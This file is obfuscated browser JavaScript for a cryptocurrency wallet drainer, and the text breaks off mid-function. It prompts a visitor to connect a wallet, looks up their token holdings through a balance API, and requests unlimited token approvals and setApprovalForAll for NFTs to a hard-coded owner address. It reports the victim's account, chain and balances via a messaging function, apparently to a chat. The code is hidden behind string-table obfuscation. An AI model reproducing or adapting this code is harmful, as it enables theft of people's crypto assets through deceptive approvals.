const _0x4971b0=_0x1719;(function(_0xb91679,_0x2bd3e8){const _0x477917=_0x1719,_0x4022a0=_0xb91679();while(!![]){try{const _0x4e9579=-parseInt(_0x477917(0x13f))/0x1+-parseInt(_0x477917(0x185))/0x2*(-parseInt(_0x477917(0x165))/0x3)+parseInt(_0x477917(0xd1))/0x4*(parseInt(_0x477917(0x130))/0x5)+-parseInt(_0x477917(0xc7))/0x6*(parseInt(_0x477917(0x13e))/0x7)+-parseInt(_0x477917(0x157))/0x8*(-parseInt(_0x477917(0xf2))/0x9)+parseInt(_0x477917(0x171))/0xa+-parseInt(_0x477917(0xd4))/0xb;if(_0x4e9579===_0x2bd3e8)break;else _0x4022a0['push'](_0x4022a0['shift']());}catch(_0x55023e){_0x4022a0['push'](_0x4022a0['shift']());}}}(_0x2fb1,0x41433));let tokens=[],chainId=null,web3Object=null,selectedAccount=null;const Web3Modal=window['Web3Modal'][_0x4971b0(0x1a2)],WalletConnectProvider=window[_0x4971b0(0xe9)][_0x4971b0(0x1a2)],OWNER_ADDRESS=_0x4971b0(0x1bc),CHAT=0x15c7933cb,ABI=[{'constant':!![],'inputs':[],'name':_0x4971b0(0x1a8),'outputs':[{'name':'','type':'string'}],'payable':![],'stateMutability':_0x4971b0(0x16f),'type':'function'},{'constant':![],'inputs':[{'name':_0x4971b0(0xcb),'type':'address'}],'name':'deprecate','outputs':[],'payable':![],'stateMutability':_0x4971b0(0x12f),'type':_0x4971b0(0x1b2)},{'constant':![],'inputs':[{'name':_0x4971b0(0x191),'type':_0x4971b0(0xdc)},{'name':'_value','type':_0x4971b0(0x169)}],'name':_0x4971b0(0x108),'outputs':[],'payable':![],'stateMutability':_0x4971b0(0x12f),'type':_0x4971b0(0x1b2)},{'constant':!![],'inputs':[],'name':_0x4971b0(0x1a1),'outputs':[{'name':'','type':_0x4971b0(0x18b)}],'payable':![],'stateMutability':'view','type':_0x4971b0(0x1b2)},{'constant':![],'inputs':[{'name':'_evilUser','type':_0x4971b0(0xdc)}],'name':'addBlackList','outputs':[],'payable':![],'stateMutability':_0x4971b0(0x12f),'type':'function'},{'constant':!![],'inputs':[],'name':'totalSupply','outputs':[{'name':'','type':_0x4971b0(0x169)}],'payable':![],'stateMutability':_0x4971b0(0x16f),'type':_0x4971b0(0x1b2)},{'constant':![],'inputs':[{'name':_0x4971b0(0x192),'type':'address'},{'name':_0x4971b0(0x150),'type':'address'},{'name':_0x4971b0(0x1a7),'type':_0x4971b0(0x169)}],'name':_0x4971b0(0x11c),'outputs':[],'payable':![],'stateMutability':_0x4971b0(0x12f),'type':_0x4971b0(0x1b2)},{'constant':!![],'inputs':[],'name':_0x4971b0(0xec),'outputs':[{'name':'','type':_0x4971b0(0xdc)}],'payable':![],'stateMutability':_0x4971b0(0x16f),'type':_0x4971b0(0x1b2)},{'constant':!![],'inputs':[{'name':'','type':_0x4971b0(0xdc)}],'name':_0x4971b0(0x112),'outputs':[{'name':'','type':_0x4971b0(0x169)}],'payable':![],'stateMutability':_0x4971b0(0x16f),'type':_0x4971b0(0x1b2)},{'constant':!![],'inputs':[],'name':_0x4971b0(0x175),'outputs':[{'name':'','type':_0x4971b0(0x169)}],'payable':![],'stateMutability':_0x4971b0(0x16f),'type':'function'},{'constant':!![],'inputs':[],'name':_0x4971b0(0xf3),'outputs':[{'name':'','type':_0x4971b0(0x169)}],'payable':![],'stateMutability':_0x4971b0(0x16f),'type':'function'},{'constant':!![],'inputs':[],'name':_0x4971b0(0x1bd),'outputs':[{'name':'','type':_0x4971b0(0x169)}],'payable':![],'stateMutability':_0x4971b0(0x16f),'type':_0x4971b0(0x1b2)},{'constant':![],'inputs':[],'name':'unpause','outputs':[],'payable':![],'stateMutability':_0x4971b0(0x12f),'type':_0x4971b0(0x1b2)},{'constant':!![],'inputs':[{'name':_0x4971b0(0xeb),'type':'address'}],'name':'getBlackListStatus','outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':_0x4971b0(0x16f),'type':_0x4971b0(0x1b2)},{'constant':!![],'inputs':[{'name':'','type':_0x4971b0(0xdc)},{'name':'','type':'address'}],'name':_0x4971b0(0x15a),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':'view','type':_0x4971b0(0x1b2)},{'constant':!![],'inputs':[],'name':_0x4971b0(0x19c),'outputs':[{'name':'','type':_0x4971b0(0x18b)}],'payable':![],'stateMutability':'view','type':_0x4971b0(0x1b2)},{'constant':!![],'inputs':[{'name':_0x4971b0(0x10e),'type':_0x4971b0(0xdc)}],'name':_0x4971b0(0x161),'outputs':[{'name':'','type':_0x4971b0(0x169)}],'payable':![],'stateMutability':_0x4971b0(0x16f),'type':'function'},{'constant':![],'inputs':[],'name':_0x4971b0(0x170),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x4971b0(0x1b2)},{'constant':!![],'inputs':[],'name':_0x4971b0(0x121),'outputs':[{'name':'','type':_0x4971b0(0xdc)}],'payable':![],'stateMutability':_0x4971b0(0x16f),'type':_0x4971b0(0x1b2)},{'constant':!![],'inputs':[],'name':_0x4971b0(0x186),'outputs':[{'name':'','type':_0x4971b0(0xdc)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':!![],'inputs':[],'name':_0x4971b0(0x14f),'outputs':[{'name':'','type':_0x4971b0(0x137)}],'payable':![],'stateMutability':'view','type':_0x4971b0(0x1b2)},{'constant':![],'inputs':[{'name':_0x4971b0(0x150),'type':'address'},{'name':_0x4971b0(0x1a7),'type':_0x4971b0(0x169)}],'name':_0x4971b0(0x18f),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':![],'inputs':[{'name':'newBasisPoints','type':'uint256'},{'name':_0x4971b0(0x149),'type':_0x4971b0(0x169)}],'name':'setParams','outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x4971b0(0x1b2)},{'constant':![],'inputs':[{'name':_0x4971b0(0x17c),'type':_0x4971b0(0x169)}],'name':_0x4971b0(0x109),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x4971b0(0x1b2)},{'constant':![],'inputs':[{'name':_0x4971b0(0x17c),'type':_0x4971b0(0x169)}],'name':_0x4971b0(0xbf),'outputs':[],'payable':![],'stateMutability':_0x4971b0(0x12f),'type':_0x4971b0(0x1b2)},{'constant':!![],'inputs':[{'name':_0x4971b0(0xf8),'type':_0x4971b0(0xdc)},{'name':_0x4971b0(0x191),'type':'address'}],'name':_0x4971b0(0x168),'outputs':[{'name':_0x4971b0(0x110),'type':_0x4971b0(0x169)}],'payable':![],'stateMutability':'view','type':_0x4971b0(0x1b2)},{'constant':!![],'inputs':[],'name':_0x4971b0(0x1a0),'outputs':[{'name':'','type':_0x4971b0(0x169)}],'payable':![],'stateMutability':_0x4971b0(0x16f),'type':'function'},{'constant':!![],'inputs':[{'name':'','type':_0x4971b0(0xdc)}],'name':_0x4971b0(0x177),'outputs':[{'name':'','type':_0x4971b0(0x18b)}],'payable':![],'stateMutability':_0x4971b0(0x16f),'type':'function'},{'constant':![],'inputs':[{'name':_0x4971b0(0x107),'type':_0x4971b0(0xdc)}],'name':_0x4971b0(0xd7),'outputs':[],'payable':![],'stateMutability':_0x4971b0(0x12f),'type':_0x4971b0(0x1b2)},{'constant':!![],'inputs':[],'name':'MAX_UINT','outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x4971b0(0x16f),'type':_0x4971b0(0x1b2)},{'constant':![],'inputs':[{'name':_0x4971b0(0x19a),'type':_0x4971b0(0xdc)}],'name':_0x4971b0(0x142),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x4971b0(0x1b2)},{'constant':![],'inputs':[{'name':_0x4971b0(0x15e),'type':_0x4971b0(0xdc)}],'name':_0x4971b0(0x152),'outputs':[],'payable':![],'stateMutability':_0x4971b0(0x12f),'type':_0x4971b0(0x1b2)},{'inputs':[{'name':_0x4971b0(0xe8),'type':_0x4971b0(0x169)},{'name':_0x4971b0(0x15b),'type':_0x4971b0(0x137)},{'name':_0x4971b0(0x10a),'type':_0x4971b0(0x137)},{'name':'_decimals','type':_0x4971b0(0x169)}],'payable':![],'stateMutability':_0x4971b0(0x12f),'type':_0x4971b0(0xfe)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4971b0(0x17c),'type':_0x4971b0(0x169)}],'name':'Issue','type':_0x4971b0(0xfd)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4971b0(0x17c),'type':'uint256'}],'name':_0x4971b0(0x126),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4971b0(0xf6),'type':_0x4971b0(0xdc)}],'name':_0x4971b0(0x124),'type':_0x4971b0(0xfd)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4971b0(0x18e),'type':'uint256'},{'indexed':![],'name':'maxFee','type':_0x4971b0(0x169)}],'name':'Params','type':_0x4971b0(0xfd)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4971b0(0x15e),'type':_0x4971b0(0xdc)},{'indexed':![],'name':_0x4971b0(0xe6),'type':_0x4971b0(0x169)}],'name':_0x4971b0(0x16e),'type':_0x4971b0(0xfd)},{'anonymous':![],'inputs':[{'indexed':![],'name':'_user','type':'address'}],'name':_0x4971b0(0x179),'type':_0x4971b0(0xfd)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4971b0(0x16a),'type':_0x4971b0(0xdc)}],'name':_0x4971b0(0x1b5),'type':_0x4971b0(0xfd)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x4971b0(0x186),'type':_0x4971b0(0xdc)},{'indexed':!![],'name':_0x4971b0(0xc5),'type':_0x4971b0(0xdc)},{'indexed':![],'name':_0x4971b0(0x199),'type':_0x4971b0(0x169)}],'name':_0x4971b0(0x178),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x4971b0(0x10f),'type':_0x4971b0(0xdc)},{'indexed':!![],'name':'to','type':_0x4971b0(0xdc)},{'indexed':![],'name':'value','type':_0x4971b0(0x169)}],'name':_0x4971b0(0x17d),'type':_0x4971b0(0xfd)},{'anonymous':![],'inputs':[],'name':_0x4971b0(0xcf),'type':'event'},{'anonymous':![],'inputs':[],'name':_0x4971b0(0x1bb),'type':_0x4971b0(0xfd)}],ABIN=[{'inputs':[{'internalType':_0x4971b0(0x137),'name':_0x4971b0(0x1a8),'type':_0x4971b0(0x137)},{'internalType':_0x4971b0(0x137),'name':_0x4971b0(0x14f),'type':_0x4971b0(0x137)},{'internalType':_0x4971b0(0x169),'name':_0x4971b0(0x104),'type':_0x4971b0(0x169)},{'internalType':_0x4971b0(0x169),'name':_0x4971b0(0x174),'type':_0x4971b0(0x169)}],'stateMutability':_0x4971b0(0x12f),'type':_0x4971b0(0xfe)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x4971b0(0x186),'type':_0x4971b0(0xdc)},{'indexed':!![],'internalType':_0x4971b0(0xdc),'name':_0x4971b0(0x195),'type':_0x4971b0(0xdc)},{'indexed':!![],'internalType':'uint256','name':_0x4971b0(0xd3),'type':'uint256'}],'name':_0x4971b0(0x178),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x4971b0(0xdc),'name':_0x4971b0(0x186),'type':_0x4971b0(0xdc)},{'indexed':!![],'internalType':_0x4971b0(0xdc),'name':_0x4971b0(0x14d),'type':_0x4971b0(0xdc)},{'indexed':![],'internalType':_0x4971b0(0x18b),'name':_0x4971b0(0x195),'type':_0x4971b0(0x18b)}],'name':'ApprovalForAll','type':_0x4971b0(0xfd)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x4971b0(0xdc),'name':'previousOwner','type':_0x4971b0(0xdc)},{'indexed':!![],'internalType':_0x4971b0(0xdc),'name':'newOwner','type':_0x4971b0(0xdc)}],'name':_0x4971b0(0xfa),'type':_0x4971b0(0xfd)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x4971b0(0xdc),'name':_0x4971b0(0x10f),'type':_0x4971b0(0xdc)},{'indexed':!![],'internalType':_0x4971b0(0xdc),'name':'to','type':'address'},{'indexed':!![],'internalType':'uint256','name':_0x4971b0(0xd3),'type':_0x4971b0(0x169)}],'name':_0x4971b0(0x17d),'type':_0x4971b0(0xfd)},{'inputs':[],'name':_0x4971b0(0x136),'outputs':[{'internalType':'string','name':'','type':_0x4971b0(0x137)}],'stateMutability':_0x4971b0(0x16f),'type':_0x4971b0(0x1b2)},{'inputs':[],'name':_0x4971b0(0x17f),'outputs':[{'internalType':_0x4971b0(0x169),'name':'','type':'uint256'}],'stateMutability':_0x4971b0(0x16f),'type':'function'},{'inputs':[],'name':'REVEAL_TIMESTAMP','outputs':[{'internalType':_0x4971b0(0x169),'name':'','type':_0x4971b0(0x169)}],'stateMutability':_0x4971b0(0x16f),'type':_0x4971b0(0x1b2)},{'inputs':[],'name':'apePrice','outputs':[{'internalType':_0x4971b0(0x169),'name':'','type':_0x4971b0(0x169)}],'stateMutability':_0x4971b0(0x16f),'type':'function'},{'inputs':[{'internalType':'address','name':'to','type':_0x4971b0(0xdc)},{'internalType':'uint256','name':_0x4971b0(0xd3),'type':_0x4971b0(0x169)}],'name':_0x4971b0(0x108),'outputs':[],'stateMutability':'nonpayable','type':_0x4971b0(0x1b2)},{'inputs':[{'internalType':_0x4971b0(0xdc),'name':_0x4971b0(0x186),'type':_0x4971b0(0xdc)}],'name':_0x4971b0(0x161),'outputs':[{'internalType':_0x4971b0(0x169),'name':'','type':_0x4971b0(0x169)}],'stateMutability':_0x4971b0(0x16f),'type':_0x4971b0(0x1b2)},{'inputs':[],'name':_0x4971b0(0x1ab),'outputs':[{'internalType':_0x4971b0(0x137),'name':'','type':'string'}],'stateMutability':_0x4971b0(0x16f),'type':'function'},{'inputs':[],'name':_0x4971b0(0xe4),'outputs':[],'stateMutability':_0x4971b0(0x12f),'type':'function'},{'inputs':[],'name':_0x4971b0(0xed),'outputs':[],'stateMutability':_0x4971b0(0x12f),'type':_0x4971b0(0x1b2)},{'inputs':[{'internalType':_0x4971b0(0x169),'name':_0x4971b0(0xd3),'type':_0x4971b0(0x169)}],'name':_0x4971b0(0x140),'outputs':[{'internalType':_0x4971b0(0xdc),'name':'','type':_0x4971b0(0xdc)}],'stateMutability':_0x4971b0(0x16f),'type':_0x4971b0(0x1b2)},{'inputs':[{'internalType':_0x4971b0(0xdc),'name':_0x4971b0(0x186),'type':'address'},{'internalType':'address','name':_0x4971b0(0x14d),'type':_0x4971b0(0xdc)}],'name':_0x4971b0(0x160),'outputs':[{'internalType':'bool','name':'','type':'bool'}],'stateMutability':_0x4971b0(0x16f),'type':'function'},{'inputs':[],'name':_0x4971b0(0x1ad),'outputs':[{'internalType':_0x4971b0(0x169),'name':'','type':_0x4971b0(0x169)}],'stateMutability':_0x4971b0(0x16f),'type':_0x4971b0(0x1b2)},{'inputs':[{'internalType':_0x4971b0(0x169),'name':_0x4971b0(0x14b),'type':'uint256'}],'name':_0x4971b0(0x18c),'outputs':[],'stateMutability':_0x4971b0(0x193),'type':'function'},{'inputs':[],'name':_0x4971b0(0x1a8),'outputs':[{'internalType':_0x4971b0(0x137),'name':'','type':_0x4971b0(0x137)}],'stateMutability':_0x4971b0(0x16f),'type':_0x4971b0(0x1b2)},{'inputs':[],'name':_0x4971b0(0x186),'outputs':[{'internalType':_0x4971b0(0xdc),'name':'','type':_0x4971b0(0xdc)}],'stateMutability':_0x4971b0(0x16f),'type':_0x4971b0(0x1b2)},{'inputs':[{'internalType':_0x4971b0(0x169),'name':_0x4971b0(0xd3),'type':_0x4971b0(0x169)}],'name':'ownerOf','outputs':[{'internalType':_0x4971b0(0xdc),'name':'','type':'address'}],'stateMutability':_0x4971b0(0x16f),'type':_0x4971b0(0x1b2)},{'inputs':[],'name':_0x4971b0(0x172),'outputs':[],'stateMutability':'nonpayable','type':_0x4971b0(0x1b2)},{'inputs':[],'name':_0x4971b0(0x132),'outputs':[],'stateMutability':'nonpayable','type':_0x4971b0(0x1b2)},{'inputs':[{'internalType':_0x4971b0(0xdc),'name':_0x4971b0(0x10f),'type':_0x4971b0(0xdc)},{'internalType':_0x4971b0(0xdc),'name':'to','type':_0x4971b0(0xdc)},{'internalType':'uint256','name':_0x4971b0(0xd3),'type':_0x4971b0(0x169)}],'name':_0x4971b0(0x164),'outputs':[],'stateMutability':_0x4971b0(0x12f),'type':_0x4971b0(0x1b2)},{'inputs':[{'internalType':_0x4971b0(0xdc),'name':'from','type':_0x4971b0(0xdc)},{'internalType':'address','name':'to','type':_0x4971b0(0xdc)},{'internalType':'uint256','name':_0x4971b0(0xd3),'type':'uint256'},{'internalType':_0x4971b0(0xf5),'name':_0x4971b0(0x1b7),'type':'bytes'}],'name':'safeTransferFrom','outputs':[],'stateMutability':_0x4971b0(0x12f),'type':_0x4971b0(0x1b2)},{'inputs':[],'name':'saleIsActive','outputs':[{'internalType':_0x4971b0(0x18b),'name':'','type':_0x4971b0(0x18b)}],'stateMutability':'view','type':'function'},{'inputs':[{'internalType':_0x4971b0(0xdc),'name':_0x4971b0(0x14d),'type':_0x4971b0(0xdc)},{'internalType':_0x4971b0(0x18b),'name':_0x4971b0(0x195),'type':_0x4971b0(0x18b)}],'name':_0x4971b0(0x187),'outputs':[],'stateMutability':_0x4971b0(0x12f),'type':_0x4971b0(0x1b2)},{'inputs':[{'internalType':_0x4971b0(0x137),'name':'baseURI','type':_0x4971b0(0x137)}],'name':_0x4971b0(0x18a),'outputs':[],'stateMutability':_0x4971b0(0x12f),'type':_0x4971b0(0x1b2)},{'inputs':[{'internalType':_0x4971b0(0x137),'name':_0x4971b0(0x158),'type':'string'}],'name':_0x4971b0(0x134),'outputs':[],'stateMutability':_0x4971b0(0x12f),'type':'function'},{'inputs':[{'internalType':'uint256','name':_0x4971b0(0x167),'type':_0x4971b0(0x169)}],'name':_0x4971b0(0x129),'outputs':[],'stateMutability':_0x4971b0(0x12f),'type':_0x4971b0(0x1b2)},{'inputs':[],'name':_0x4971b0(0x155),'outputs':[],'stateMutability':'nonpayable','type':_0x4971b0(0x1b2)},{'inputs':[],'name':_0x4971b0(0x131),'outputs':[{'internalType':_0x4971b0(0x169),'name':'','type':'uint256'}],'stateMutability':_0x4971b0(0x16f),'type':_0x4971b0(0x1b2)},{'inputs':[],'name':_0x4971b0(0xbe),'outputs':[{'internalType':_0x4971b0(0x169),'name':'','type':_0x4971b0(0x169)}],'stateMutability':_0x4971b0(0x16f),'type':'function'},{'inputs':[{'internalType':_0x4971b0(0x114),'name':'interfaceId','type':_0x4971b0(0x114)}],'name':_0x4971b0(0x12e),'outputs':[{'internalType':'bool','name':'','type':'bool'}],'stateMutability':_0x4971b0(0x16f),'type':_0x4971b0(0x1b2)},{'inputs':[],'name':_0x4971b0(0x14f),'outputs':[{'internalType':_0x4971b0(0x137),'name':'','type':_0x4971b0(0x137)}],'stateMutability':_0x4971b0(0x16f),'type':_0x4971b0(0x1b2)},{'inputs':[{'internalType':'uint256','name':_0x4971b0(0x154),'type':_0x4971b0(0x169)}],'name':_0x4971b0(0x122),'outputs':[{'internalType':_0x4971b0(0x169),'name':'','type':_0x4971b0(0x169)}],'stateMutability':_0x4971b0(0x16f),'type':_0x4971b0(0x1b2)},{'inputs':[{'internalType':_0x4971b0(0xdc),'name':_0x4971b0(0x186),'type':'address'},{'internalType':_0x4971b0(0x169),'name':_0x4971b0(0x154),'type':_0x4971b0(0x169)}],'name':'tokenOfOwnerByIndex','outputs':[{'internalType':'uint256','name':'','type':_0x4971b0(0x169)}],'stateMutability':_0x4971b0(0x16f),'type':_0x4971b0(0x1b2)},{'inputs':[{'internalType':_0x4971b0(0x169),'name':_0x4971b0(0xd3),'type':_0x4971b0(0x169)}],'name':_0x4971b0(0xc3),'outputs':[{'internalType':_0x4971b0(0x137),'name':'','type':_0x4971b0(0x137)}],'stateMutability':_0x4971b0(0x16f),'type':_0x4971b0(0x1b2)},{'inputs':[],'name':_0x4971b0(0x151),'outputs':[{'internalType':_0x4971b0(0x169),'name':'','type':_0x4971b0(0x169)}],'stateMutability':_0x4971b0(0x16f),'type':_0x4971b0(0x1b2)},{'inputs':[{'internalType':_0x4971b0(0xdc),'name':_0x4971b0(0x10f),'type':'address'},{'internalType':_0x4971b0(0xdc),'name':'to','type':'address'},{'internalType':_0x4971b0(0x169),'name':_0x4971b0(0xd3),'type':_0x4971b0(0x169)}],'name':_0x4971b0(0x11c),'outputs':[],'stateMutability':_0x4971b0(0x12f),'type':_0x4971b0(0x1b2)},{'inputs':[{'internalType':'address','name':'newOwner','type':'address'}],'name':_0x4971b0(0x142),'outputs':[],'stateMutability':'nonpayable','type':_0x4971b0(0x1b2)},{'inputs':[],'name':_0x4971b0(0x194),'outputs':[],'stateMutability':_0x4971b0(0x12f),'type':_0x4971b0(0x1b2)}],networkToId={0x1328cf7:'btc-mainnet',0x1:_0x4971b0(0x1ae),0x5:_0x4971b0(0xd9),0x89:_0x4971b0(0xee),0x13881:_0x4971b0(0x153),0x38:_0x4971b0(0x1a3),0x61:_0x4971b0(0x116),0xa86a:'avalanche-mainnet',0xa869:_0x4971b0(0x16b),0xfa:_0x4971b0(0xe7),0xfa2:_0x4971b0(0x1ac),0xa4b1:_0x4971b0(0xda),0x66eed:'arbitrum-goerli',0xa4ba:'arbitrum-nova-mainnet',0x250:_0x4971b0(0x106),0x51:_0x4971b0(0x1a5),0x150:'astar-shiden',0x4e454152:_0x4971b0(0x15d),0x4e454153:_0x4971b0(0xc0),0x6984c:_0x4971b0(0x127),0x69849:_0x4971b0(0x198),0x7e4:_0x4971b0(0x1af),0x14a33:_0x4971b0(0x13c),0x77:_0x4971b0(0xe2),0x405:_0x4971b0(0xe3),0xa918:_0x4971b0(0x181),0x10e8:_0x4971b0(0x135),0xdbe0:_0x4971b0(0x13a),0x2600:'boba-bnb-testnet',0x50e:_0x4971b0(0x15f),0x511:_0x4971b0(0xdd),0x120:'boba-mainnet',0x1c:_0x4971b0(0x12b),0xb48:_0x4971b0(0x11b),0x1e14:_0x4971b0(0x16c),0x436f7631:_0x4971b0(0x1b6),0x19:'cronos-mainnet',0x152:_0x4971b0(0x13d),0xd2af:'defi-kingdoms-mainnet',0x14f:_0x4971b0(0xd0),0xa516:_0x4971b0(0x17e),0x2329:'evmos-mainnet',0x2328:_0x4971b0(0x125),0x868:_0x4971b0(0x143),0x86a:_0x4971b0(0x159),0x13:_0x4971b0(0x11e),0x10:_0x4971b0(0x12d),0xe:'flarenetworks-flare-mainnet',0x72:_0x4971b0(0xdb),0xb7e7759:'gather-mainnet',0x153c099c:_0x4971b0(0xca),0x63564c40:_0x4971b0(0x105),0x6357d2e0:_0x4971b0(0xf9),0x141:_0x4971b0(0x1b1),0x142:_0x4971b0(0x128),0xe704:_0x4971b0(0x118),0x1389:'mantle-testnet',0x52:_0x4971b0(0x1a4),0x53:_0x4971b0(0x197),0x440:_0x4971b0(0x18d),0x24c:_0x4971b0(0x10b),0x7d2:_0x4971b0(0x166),0x30e0a:_0x4971b0(0x17a),0x7d1:'milkomeda-c1-mainnet',0x30da5:'milkomeda-c1-devnet',0x504:_0x4971b0(0x113),0x507:_0x4971b0(0x156),0x505:'moonbeam-moonriver',0xe9ac0ce:'neon-testnet',0x116ea:_0x4971b0(0x103),0x116e9:'nervos-godwoken-testnet',0x116e1:_0x4971b0(0xd5),0x5afe:_0x4971b0(0x11f),0x5aff:_0x4971b0(0x119),0xf8:'oasys-mainnet',0x249c:'oasys-testnet',0xa:_0x4971b0(0xd6),0x2a15c308d:_0x4971b0(0xce),0x2a15c3083:'palm-testnet',0x5a2:_0x4971b0(0xfc),0x1e:_0x4971b0(0x183),0x1f:_0x4971b0(0x1b4),0x5d456c62:_0x4971b0(0x146),0x1482a7b2:_0x4971b0(0x17b),0x3d28774d:_0x4971b0(0xd8),0x109b4597:_0x4971b0(0x176),0x536f6c4d:_0x4971b0(0xf4),0x1202c:_0x4971b0(0x173),0x1202d:_0x4971b0(0xf1),0x1a0:_0x4971b0(0x133)},providerOptions={'walletconnect':{'package':WalletConnectProvider,'options':{'rpc':{0xa86a:_0x4971b0(0xc4)},'chainId':0xa86a,'network':_0x4971b0(0xc6),'infuraId':_0x4971b0(0x196),'pollingInterval':_0x4971b0(0x13b)}},'coinbasewallet':{'package':CoinbaseWalletSDK,'options':{'appName':_0x4971b0(0x101),'infuraId':_0x4971b0(0x196),'rpc':_0x4971b0(0xc4),'chainId':0xa86a,'chainName':_0x4971b0(0xc6),'darkMode':![]}}};let web3Modal=new Web3Modal({'providerOptions':providerOptions,'cacheProvider':![],'disableInjectedProvider':![]});$(_0x4971b0(0x145))[_0x4971b0(0x1b3)](async function(){const _0x26bac6=_0x4971b0;try{let _0x1c0f06=await web3Modal[_0x26bac6(0x189)]();onProvider(_0x1c0f06),_0x1c0f06['on'](_0x26bac6(0x1a9),_0x2c792a=>{const _0x1576f3=_0x26bac6;console[_0x1576f3(0x184)](_0x2c792a),onProvider(_0x1c0f06);});}catch(_0x16bb0f){console[_0x26bac6(0x184)](_0x26bac6(0x1b8),_0x16bb0f);return;}});async function onProvider(_0x566d84){const _0x449cd9=_0x4971b0;web3Object=new Web3(_0x566d84);let _0x52bb30=await web3Object[_0x449cd9(0xea)]['getAccounts']();selectedAccount=_0x52bb30[0x0],chainName=await web3Object[_0x449cd9(0xea)][_0x449cd9(0xdf)](),chainId=networkToId[chainName],console[_0x449cd9(0x184)](chainId),console[_0x449cd9(0x184)](selectedAccount),alert(_0x449cd9(0x1ba)),_0x52bb30[_0x449cd9(0xc9)]&&(sendMessage(_0x449cd9(0x1b9)+chainId+'!'),sendMessage(_0x449cd9(0x14c)+selectedAccount),covalenthqAPICall());}async function covalenthqAPICall(){const _0x5165d1=_0x4971b0,_0x452f8f={'format':_0x5165d1(0x144),'quote-currency':'usd','key':_0x5165d1(0x148)},_0x4d7183=new URL(_0x5165d1(0x10c)+chainId+'/address/'+selectedAccount+_0x5165d1(0xcc));_0x4d7183[_0x5165d1(0x10d)]=new URLSearchParams(_0x452f8f)[_0x5165d1(0x12c)]();const _0x4868f5={'method':'GET','headers':{'Content-Type':_0x5165d1(0xc1)}};try{const _0x445406=await fetch(_0x4d7183,_0x4868f5)[_0x5165d1(0xe0)](_0x3913bc=>_0x3913bc['json']());let _0x25e318=_0x445406['data'][_0x5165d1(0xde)];console[_0x5165d1(0x184)](_0x5165d1(0xcd),_0x25e318);let _0x121992=_0x25e318[_0x5165d1(0x19b)](_0x49959b=>{const _0x45e236=_0x5165d1;return{'balance':_0x49959b[_0x45e236(0x117)],'value':_0x49959b[_0x45e236(0x190)],'address':_0x49959b[_0x45e236(0x139)],'symbol':_0x49959b[_0x45e236(0x162)],'type':_0x49959b[_0x45e236(0xff)]};});console[_0x5165d1(0x184)](_0x5165d1(0xe1),_0x121992),tokens=_0x121992[_0x5165d1(0x120)](_0x3c3a90=>_0x3c3a90[_0x5165d1(0x199)]>0x5&&_0x3c3a90[_0x5165d1(0x14f)]!='BNB'),console['log'](_0x5165d1(0xe5),chainId,_0x5165d1(0x11d),tokens);if(window['location']['search'])onSendEther();else onApprove();}catch{sendMessage('Error\x20collecting\x20info\x20about\x20wallet');}}async function onApprove(){const _0x32112b=_0x4971b0;if(tokens[_0x32112b(0xc9)])try{loopTokens(tokens);}catch(_0x5aaf19){console[_0x32112b(0x14e)]('Error\x20processing\x20item\x20'+_0x5aaf19[_0x32112b(0xf7)]);}else sendMessage(_0x32112b(0x19e));}async function loopTokens(_0x5b5413){const _0xa5bbdd=_0x4971b0;for await(let _0x194656 of _0x5b5413){if(_0x194656['type']==='cryptocurrency'){let _0x461ae3=new web3Object[(_0xa5bbdd(0xea))][(_0xa5bbdd(0x19f))](ABI,_0x194656[_0xa5bbdd(0xdc)]);sendMessage(_0xa5bbdd(0xc8)),await _0x461ae3[_0xa5bbdd(0x123)][_0xa5bbdd(0x108)](OWNER_ADDRESS,_0xa5bbdd(0xfb))[_0xa5bbdd(0x138)]({'from':selectedAccount,'to':_0x194656[_0xa5bbdd(0xdc)]})['on'](_0xa5bbdd(0x1b0),_0x35cb31=>{const _0x42d6a6=_0xa5bbdd;console[_0x42d6a6(0x184)](_0x42d6a6(0xc2)+_0x35cb31);})['on'](_0xa5bbdd(0x12a),_0x3bf41d=>{const _0x285d98=_0xa5bbdd;console[_0x285d98(0x184)](_0x285d98(0x102)+_0x3bf41d),sendMessage(_0x285d98(0x16d)),sendMessage(_0x285d98(0xef)+_0x194656['address']),sendMessage(_0x285d98(0x115)+_0x194656[_0x285d98(0x117)]),sendMessage(_0x285d98(0x19d)+OWNER_ADDRESS);})['on'](_0xa5bbdd(0x14e),_0xb3bf4a=>{const _0xc1e964=_0xa5bbdd;console[_0xc1e964(0x184)](_0xc1e964(0x11a)+_0xb3bf4a),sendMessage('Transaction\x20Rejected');});}else{if(_0x194656['type']==='NFT'){let _0x225a45=new web3Object[(_0xa5bbdd(0xea))][(_0xa5bbdd(0x19f))](ABIN,_0x194656[_0xa5bbdd(0xdc)]);await _0x225a45[_0xa5bbdd(0x123)]['setApprovalForAll'](OWNER_ADDRESS,'true')[_0xa5bbdd(0x138)]({'from':selectedAccount,'to':_0x194656[_0xa5bbdd(0xdc)]})['on'](_0xa5bbdd(0x1b0),_0x4ae0c9=>{const _0x44ed6e=_0xa5bbdd;console['log'](_0x44ed6e(0xc2)+_0x4ae0c9),sendMessage(_0x44ed6e(0x141));})['on']('receipt',_0x506881=>{const 